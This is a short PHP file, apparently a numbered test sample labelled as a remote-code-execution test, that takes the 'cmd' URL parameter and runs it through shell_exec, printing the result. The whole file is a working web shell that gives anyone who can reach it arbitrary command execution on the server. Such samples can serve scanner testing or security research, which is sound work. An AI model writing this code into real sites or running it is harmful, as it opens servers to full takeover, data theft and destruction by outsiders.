<?php
// RCE test variation #633
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>